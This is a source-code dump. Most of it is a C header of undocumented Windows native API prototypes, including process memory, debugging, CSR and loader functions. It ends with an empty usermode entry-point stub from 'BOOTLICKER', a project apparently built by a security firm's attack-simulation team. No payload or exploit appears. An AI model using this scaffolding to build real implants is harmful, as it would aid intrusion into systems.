    IN PGENERIC_MAPPING GenericMapping,
    IN HANDLE Token OPTIONAL
    );

typedef ULONG (NTAPI RTLP_UNHANDLED_EXCEPTION_FILTER) (
    struct _EXCEPTION_POINTERS *ExceptionInfo
    );

typedef RTLP_UNHANDLED_EXCEPTION_FILTER *PRTLP_UNHANDLED_EXCEPTION_FILTER;

VOID
RtlSetUnhandledExceptionFilter (
    PRTLP_UNHANDLED_EXCEPTION_FILTER UnhandledExceptionFilter
    );

NTSTATUS
NTAPI
RtlStartProfile (
    VOID
    );

NTSTATUS
NTAPI
RtlStopProfile (
    VOID
    );

NTSTATUS
RtlWow64EnableFsRedirection(
    IN BOOLEAN Wow64FsEnableRedirection
    );


NTSTATUS
RtlWow64EnableFsRedirectionEx(
    IN PVOID Wow64FsEnableRedirection,
    OUT PVOID *OldFsRedirectionLevel
    );

NTSTATUS
NTAPI
RtlRegisterWait(
    OUT PHANDLE WaitHandle,
    IN  HANDLE  Handle,
    IN  WAITORTIMERCALLBACKFUNC Function,
    IN  PVOID Context,
    IN  ULONG  Milliseconds,
    IN  ULONG  Flags
    );

NTSTATUS
NTAPI
RtlDeregisterWait(
    IN HANDLE WaitHandle
    );

NTSTATUS
NTAPI
RtlDeregisterWaitEx(
    IN HANDLE WaitHandle,
    IN HANDLE Event
    );

#define RtlEqualMemory(Destination,Source,Length) (!memcmp((Destination),(Source),(Length)))
#define RtlMoveMemory(Destination,Source,Length) memmove((Destination),(Source),(Length))
#define RtlCopyMemory(Destination,Source,Length) memcpy((Destination),(Source),(Length))
#define RtlFillMemory(Destination,Length,Fill) memset((Destination),(Fill),(Length))
#define RtlZeroMemory(Destination,Length) memset((Destination),0,(Length))

typedef
VOID
(*PKNORMAL_ROUTINE)
(IN PVOID NormalContext,
 IN PVOID SystemArgument1,
 IN PVOID SystemArgument2
 );

VOID
KiUserCallbackDispatcher(
	IN ULONG ApiNumber,
	IN PVOID InputBuffer,
	IN ULONG INputLength
	);

NTSTATUS
NTAPI
CsrClientConnectToServer(
    IN PWSTR ObjectDirectory,
    IN ULONG ServertDllIndex,
    IN PCSR_CALLBACK_INFO CallbackInformation OPTIONAL,
    IN PVOID ConnectionInformation,
    IN OUT PULONG ConnectionInformationLength OPTIONAL,
    OUT PBOOLEAN CalledFromServer OPTIONAL
    );


NTSTATUS
NTAPI
CsrClientCallServer(
    IN OUT PCSR_API_MSG m,
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer OPTIONAL,
    IN CSR_API_NUMBER ApiNumber,
    IN ULONG ArgLength
    );


PCSR_CAPTURE_HEADER
NTAPI
CsrAllocateCaptureBuffer(
    IN ULONG CountMessagePointers,
    IN ULONG CountCapturePointers,
    IN ULONG Size
    );

VOID
NTAPI
CsrFreeCaptureBuffer(
    IN PCSR_CAPTURE_HEADER CaptureBuffer
    );


ULONG
NTAPI
CsrAllocateMessagePointer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN ULONG Length,
    OUT PVOID *Pointer
    );

VOID
NTAPI
CsrCaptureMessageBuffer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length,
    OUT PVOID *CapturedBuffer
    );

VOID
NTAPI
CsrCaptureMessageString(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PCSTR String,
    IN ULONG Length,
    IN ULONG MaximumLength,
    OUT PSTRING CapturedString
    );

PLARGE_INTEGER
NTAPI
CsrCaptureTimeout(
    IN ULONG Milliseconds,
    OUT PLARGE_INTEGER Timeout
    );

VOID
NTAPI
CsrProbeForWrite(
    IN PVOID Address,
    IN ULONG Length,
    IN ULONG Alignment
    );

VOID
NTAPI
CsrProbeForRead(
    IN PVOID Address,
    IN ULONG Length,
    IN ULONG Alignment
    );

NTSTATUS
NTAPI
CsrNewThread(
    VOID
    );

NTSTATUS
NTAPI
CsrIdentifyAlertableThread(
    VOID
    );

NTSTATUS
NTAPI
CsrSetPriorityClass(
    IN HANDLE ProcessHandle,
    IN OUT PULONG PriorityClass
    );

//added 20/03/2011
NTSTATUS
NTAPI
RtlCreateProcessReflection(
	IN HANDLE ProcessHandle,
	IN ULONG Flags,
	IN OPTIONAL PVOID StartRoutine,
	IN OPTIONAL PVOID StartContext,
	IN OPTIONAL HANDLE EventHandle,
	OUT OPTIONAL PRTL_PROCESS_REFLECTION_INFORMATION ReflectionInformation
	);


NTSTATUS
NTAPI
RtlCloneUserProcess(
	IN ULONG ProcessFlags,
	IN OPTIONAL PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
	IN OPTIONAL PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
	IN OPTIONAL HANDLE DebugPort,
	OUT PRTL_USER_PROCESS_INFORMATION ProcessInformation
	);


VOID
NTAPI
LdrShutdownProcess(
	);

NTSTATUS
NTAPI
RtlQueryProcessModuleInformation(
    IN HANDLE hProcess OPTIONAL,
    IN ULONG Flags,
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessBackTraceInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessHeapInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessLockInformation(
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

PRTL_DEBUG_INFORMATION
NTAPI
RtlCreateQueryDebugBuffer(
    IN ULONG MaximumCommit OPTIONAL,
    IN BOOLEAN UseEventPair
    );

NTSTATUS
NTAPI
RtlDestroyQueryDebugBuffer(
    IN PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlQueryProcessDebugInformation(
    IN HANDLE UniqueProcessId,
    IN ULONG Flags,
    IN OUT PRTL_DEBUG_INFORMATION Buffer
    );

NTSTATUS
NTAPI
RtlCreateTimer(
    IN HANDLE TimerQueueHandle,
    OUT HANDLE *Handle,
    IN WAITORTIMERCALLBACKFUNC Function,
    IN PVOID Context,
    IN ULONG DueTime,
    IN ULONG Period,
    IN ULONG Flags
    );

NTSTATUS
NTAPI
RtlUpdateTimer(
    IN HANDLE TimerQueueHandle,
    IN HANDLE TimerHandle,
    IN ULONG  DueTime,
    IN ULONG  Period
    );

NTSTATUS
NTAPI
RtlDeleteTimer(
    IN HANDLE TimerQueueHandle,
    IN HANDLE TimerToCancel,
    IN HANDLE Event
    );

NTSTATUS
NTAPI
RtlDeleteTimerQueue(
    IN HANDLE TimerQueueHandle
    );

NTSTATUS
NTAPI
RtlDeleteTimerQueueEx(
    IN HANDLE TimerQueueHandle,
    IN HANDLE Event
    );


BOOLEAN
NTAPI
RtlDoesFileExists_U(
    PCWSTR FileName
    );


ULONG
RtlGetCurrentDirectory_U(
	ULONG nBufferLength,
	PWSTR lpBuffer
	);

NTSTATUS
RtlSetCurrentDirectory_U(
	PUNICODE_STRING PathName
	);


ULONG
RtlDosSearchPath_U(
	IN PWSTR lpPath,
	IN PWSTR lpFileName,
	IN PWSTR lpExtension OPTIONAL,
	IN ULONG nBufferLength,
	OUT PWSTR lpBuffer,
	OUT PWSTR *lpFilePart
	);


void
NTAPI
RtlInitString(
    PSTRING DestinationString,
    PCSZ SourceString
    );

ULONG
NTAPI
RtlGetFullPathName_U(
    IN PCWSTR lpFileName,
    IN ULONG nBufferLength,
    OUT PWSTR lpBuffer,
    OUT OPTIONAL PWSTR *lpFilePart
    );

LONG
NTAPI
RtlCompareString(
    const STRING * String1,
    const STRING * String2,
    BOOLEAN CaseInSensitive
    );


NTSTATUS
NTAPI
LdrRegisterDllNotification(
	IN ULONG Flags,
	IN PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
	IN PVOID Context,
	OUT PVOID *Cookie
	);


NTSTATUS
NTAPI
LdrUnregisterDllNotification(
	IN PVOID Cookie
	);


ULONG
NTAPI
EtwRegisterSecurityProvider();

ULONG
NTAPI
EtwWriteUMSecurityEvent(
    PCEVENT_DESCRIPTOR EventDescriptor,
    USHORT EventProperty,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData);


ULONG
NTAPI
EtwEventWriteEndScenario(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);

ULONG
NTAPI
EtwEventWriteFull(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	USHORT EventProperty,
	LPCGUID ActivityId,
	LPCGUID RelatedActivityId,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);


ULONG
NTAPI
EtwEventWriteStartScenario(
	REGHANDLE RegHandle,
	PCEVENT_DESCRIPTOR EventDescriptor,
	ULONG UserDataCount,
	PEVENT_DATA_DESCRIPTOR UserData
	);


//
// old channel apis, from nt4
//

NTSTATUS
NTAPI
NtCreateChannel (
    OUT PHANDLE ChannelHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL
    );

NTSTATUS
NTAPI
NtOpenChannel (
    OUT PHANDLE ChannelHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSTATUS
NTAPI
NtListenChannel (
    IN HANDLE ChannelHandle,
    OUT PCHANNEL_MESSAGE *Message
	);

NTSTATUS
NTAPI
NtSendWaitReplyChannel (
    IN HANDLE ChannelHandle,
    IN PVOID Text,
    IN ULONG Length,
    OUT PCHANNEL_MESSAGE *Message
    );

NTSTATUS
NTAPI
NtReplyWaitSendChannel (
    IN PVOID Text,
    IN ULONG Length,
    OUT PCHANNEL_MESSAGE *Message
    );


ULONG
NTAPI
AlpcUnregisterCompletionListWorkerThread(
		PVOID CompletionList
		);


void
NTAPI
RtlUpdateClonedCriticalSection(
		PRTL_CRITICAL_SECTION CriticalSection
		);

NTSTATUS
NTAPI
RtlGetFullPathName_UstrEx(
		PUNICODE_STRING FileName,
		PUNICODE_STRING StaticString,
		PUNICODE_STRING DynamicString,
		PPUNICODE_STRING StringUsed,
		PULONG FilePartPrefixCch,
		PUCHAR NameInvalid,
		PRTL_PATH_TYPE InputPathType,
		PULONG BytesRequired);

int
NTAPI
LdrInitShimEngineDynamic(
		PVOID pShimEngineModule);

NTSTATUS
NTAPI
NtCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );

NTSTATUS
NTAPI
NtSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );

NTSTATUS
NTAPI
NtDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );

NTSTATUS
RtlGetVersion(
	OUT PRTL_OSVERSIONINFOW lpVersionInformation
	);
		
NTSTATUS
NTAPI
ZwWow64QueryInformationProcess64(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );


NTSTATUS
NTAPI
ZwWow64QueryVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );


NTSTATUS
NTAPI
ZwWow64ReadVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );


NTSTATUS
NTAPI
ZwWow64WriteVirtualMemory64(
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );

void
NTAPI
ZwWow64GetCurrentProcessorNumberEx(
		OUT PPROCESSOR_NUMBER ProcNumber
);

PCSR_CAPTURE_HEADER
NTAPI
ZwWow64CsrAllocateCaptureBuffer(
    IN ULONG CountMessagePointers,
    IN ULONG CountCapturePointers,
    IN ULONG Size
    );

ULONG
NTAPI
ZwWow64CsrAllocateMessagePointer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN ULONG Length,
    OUT PVOID *Pointer
    );

void
NTAPI
ZwWow64CsrCaptureMessageBuffer(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PVOID Buffer OPTIONAL,
    IN ULONG Length,
    OUT PVOID *CapturedBuffer
    );

void
NTAPI
ZwWow64CsrCaptureMessageString(
    IN OUT PCSR_CAPTURE_HEADER CaptureBuffer,
    IN PCSTR String,
    IN ULONG Length,
    IN ULONG MaximumLength,
    OUT PSTRING CapturedString
    );

NTSTATUS
NTAPI
ZwWow64CsrClientConnectToServer(
    IN PWSTR ObjectDirectory,
    IN ULONG ServerDllIndex,
    IN PCSR_CALLBACK_INFO CallbackInformation OPTIONAL,
    IN PVOID ConnectionInformation,
    IN OUT PULONG ConnectionInformationLength OPTIONAL,
    OUT PBOOLEAN CalledFromServer OPTIONAL
    );

void
NTAPI
ZwWow64CsrFreeCaptureBuffer(
    IN PCSR_CAPTURE_HEADER CaptureBuffer
    );

NTSTATUS
NTAPI
ZwWow64CsrIdentifyAlertableThread( 
    void
    );

NTSTATUS
NTAPI
ZwWow64DebuggerCall (
    IN ULONG ServiceClass,
    IN ULONG Arg1,
    IN ULONG Arg2
    );

NTSTATUS
NTAPI
RtlCleanUpTEBLangLists(
		void
		);

VOID
KiUserApcDispatcher (
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2,
	PKNORMAL_ROUTINE NormalRoutine
	);

VOID
KiUserExceptionDispatcher (
	PEXCEPTION_RECORD ExceptionRecord,
	PCONTEXT ContextFrame
	);

NTSTATUS
NTAPI
NtCreateDebugObject(
	OUT PHANDLE DebugObjectHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN ULONG Flags
	);

NTSTATUS
NTAPI
NtDebugActiveProcess(
	IN HANDLE ProcessHandle,
	IN HANDLE DebugObjectHandle
	);

NTSTATUS
NTAPI
NtDebugContinue(
	IN HANDLE DebugObjectHandle,
	IN PCLIENT_ID ClientId,
	IN NTSTATUS ContinueStatus
	);

NTSTATUS
NTAPI
NtRemoveProcessDebug(
	IN HANDLE ProcessHandle,
	IN HANDLE DebugObjectHandle
	);

NTSTATUS
NTAPI
NtSetInformationDebugObject(
	IN HANDLE DebugObjectHandle,
	IN DEBUGOBJECTINFOCLASS DebugObjectInformationClass,
	IN PVOID DebugInformation,
	IN ULONG DebugInformationLength,
	OUT OPTIONAL PULONG ReturnLength
	);

NTSTATUS
NTAPI
NtWaitForDebugEvent(
	IN HANDLE DebugObjectHandle,
	IN BOOLEAN Alertable,
	IN OPTIONAL PLARGE_INTEGER Timeout,
	OUT PVOID WaitStateChange
	);

// Debugging UI

NTSTATUS
NTAPI
DbgUiConnectToDbg(
	VOID
	);

HANDLE
NTAPI
DbgUiGetThreadDebugObject(
	VOID
	);

VOID
NTAPI
DbgUiSetThreadDebugObject(
	IN HANDLE DebugObject
	);

NTSTATUS
NTAPI
DbgUiWaitStateChange(
	OUT PDBGUI_WAIT_STATE_CHANGE StateChange,
	IN OPTIONAL PLARGE_INTEGER Timeout
	);

NTSTATUS
NTAPI
DbgUiContinue(
	IN PCLIENT_ID AppClientId,
	IN NTSTATUS ContinueStatus
	);

NTSTATUS
NTAPI
DbgUiStopDebugging(
	IN HANDLE Process
	);

NTSTATUS
NTAPI
DbgUiDebugActiveProcess(
	IN HANDLE Process
	);

VOID
NTAPI
DbgUiRemoteBreakin(
	IN PVOID Context
	);

NTSTATUS
NTAPI
DbgUiIssueRemoteBreakin(
	IN HANDLE Process
	);

VOID
NTAPI
RtlExitUserProcess(
	IN NTSTATUS ExitStatus
	);

NTSTATUS
NTAPI
RtlQueueWorkItem(
	IN WORKERCALLBACKFUNC CallbackFunction,
	IN OPTIONAL PVOID Context,
	IN ULONG Flags
	);


NTSTATUS
NTAPI
RtlCreateUserStack(
	SIZE_T CommittedStackSize,
	SIZE_T MaximumStackSize,
	SIZE_T ZeroBits,
	ULONG PageSize,
	ULONG ReserveAlignment,
	PINITIAL_TEB InitialTeb
	);


LRESULT
NTAPI
NtdllDefWindowProc_W(
	);


LRESULT
NTAPI
NtdllDefWindowProc_A(
	);


NTSTATUS
NTAPI
LdrQueryProcessModuleInformation(
	PRTL_PROCESS_MODULES ModuleInformation,
	ULONG ModuleInformationLength,
	PULONG ReturnLength
	);


//
// end non-crt prototypes
//


//
// nt crt
//
//please do not change swprintf stuff otherwise win32 mode is always trashed
#if !defined(_NO_NTDLL_CRT_)
int __cdecl vsprintf( char *, const char *, va_list );
int __cdecl _vsnprintf( char *, size_t, const char *, va_list );
int __cdecl sprintf( char *, const char *, ... );
int __cdecl _snprintf( char *, size_t, const char *, ... );
int __cdecl _snwprintf( wchar_t *, size_t, const wchar_t *, ... );
int __cdecl swprintf( wchar_t *, const wchar_t *, ... );
int __cdecl sscanf( const char *, const char *, ... );
int __cdecl _vscwprintf( const wchar_t *, va_list );
int __cdecl _vsnwprintf( wchar_t *, size_t, const wchar_t *, va_list );

//readded 4 jan 2012
//win64 mode does not need this
//for using this routines ntdllp.lib is required
#if !defined(_M_X64)
IMPORT_FN size_t __cdecl wcslen(const wchar_t *);
IMPORT_FN wchar_t * __cdecl wcscat(wchar_t *dst, const wchar_t *src);
IMPORT_FN int __cdecl wcscmp(const wchar_t *src, const wchar_t *dst);
IMPORT_FN int __cdecl _wcsicmp(const wchar_t *, const wchar_t *);
IMPORT_FN int __cdecl _wcsnicmp(const wchar_t *, const wchar_t *, size_t);
IMPORT_FN wchar_t * __cdecl _wcslwr(wchar_t *);
IMPORT_FN wchar_t * __cdecl _wcsupr(wchar_t *);
IMPORT_FN wchar_t * __cdecl wcschr(const wchar_t *string, wchar_t ch);
IMPORT_FN wchar_t * __cdecl wcscpy(wchar_t *dst, const wchar_t *src);
IMPORT_FN wchar_t * __cdecl wcsncat(wchar_t *front, const wchar_t *back, size_t count);
IMPORT_FN wchar_t * __cdecl wcsncpy(wchar_t *dest, const wchar_t *source, size_t count);
#endif //_M_X64

#endif	// _NO_NTDLL_CRT_

#ifdef __cplusplus
}
#endif


#endif /* _NTDLL_ */

```

`usermode/UsermodeMain.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Does absolute nothing. Write your usermode code here.
 *
!*/
D_SEC( F ) VOID NTAPI UsermodeMain( _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2, _In_ PVOID SystemArgument3 )
{

};

```